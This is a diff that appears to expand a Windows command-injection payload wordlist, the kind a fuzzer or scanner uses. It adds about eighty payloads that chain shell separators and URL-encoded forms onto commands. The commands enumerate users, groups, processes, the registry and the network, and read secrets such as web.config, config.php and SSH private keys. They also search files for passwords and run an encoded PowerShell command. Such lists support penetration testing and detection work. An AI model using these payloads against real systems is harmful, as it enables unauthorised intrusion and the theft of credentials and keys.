@@ -1,6 +1,83 @@
-cmd /c whoami
-cmd /c dir
-cmd /c type C:\Windows\win.ini
-cmd.exe /c whoami
-%COMSPEC% /c whoami
-%SystemRoot%\system32\cmd.exe /c whoami
+& whoami
+& dir
+| whoami
+| dir
+&& whoami
+|| whoami
+; whoami
+` whoami
+$(whoami)
+& type C:\Windows\win.ini
+& type C:\boot.ini
+& type C:\inetpub\wwwroot\web.config
+& type C:\xampp\htdocs\config.php
+& dir C:\
+& dir C:\Windows
+& dir C:\Users
+& dir C:\Program Files
+& dir C:\inetpub
+& ipconfig
+& ipconfig /all
+& net user
+& net localgroup administrators
+& net share
+& tasklist
+& tasklist /V
+& systeminfo
+& ver
+& hostname
+& set
+& echo %USERNAME%
+& echo %USERDOMAIN%
+& echo %COMPUTERNAME%
+& echo %SYSTEMROOT%
+& echo %TEMP%
+& echo %PATH%
+& echo %APPDATA%
+& ping -n 1 127.0.0.1
+& ping -n 5 127.0.0.1
+& netstat -an
+& netstat -rn
+& arp -a
+& route print
+& wmic os get name
+& wmic computersystem get name
+& wmic useraccount get name
+& wmic process list brief
+& wmic product get name
+& reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
+& reg query HKCU\SOFTWARE
+& reg query HKLM\SYSTEM\CurrentControlSet\Services
+& dir /a C:\Windows\System32
+& dir /s /b C:\Users\*password*
+& findstr /si password *.txt *.xml *.config
+& findstr /si username *.txt *.xml *.config
+& type %USERPROFILE%\.ssh\id_rsa
+& copy C:\Windows\win.ini %TEMP%\x.txt
+& del %TEMP%\x.txt
+& md %TEMP%\test
+& attrib C:\Windows\win.ini
+& cacls C:\Windows\win.ini
+& icacls C:\Windows\win.ini
+& schtasks /query
+& at
+& sc query
+& sc queryex
+& netsh firewall show state
+& netsh advfirewall show allprofiles
+& powershell -c "Get-Process"
+& powershell -c "Get-Service"
+& powershell -c "Get-LocalUser"
+& powershell -c "whoami"
+& powershell -enc aQBkAA==
+& cmd /c whoami
+& cmd /c dir
+& cmd.exe /c whoami
+& cmd.exe /c dir
+%26 whoami
+%7c whoami
+%26%26 whoami
+%7c%7c whoami
+%0d%0awhoami
+
+whoami
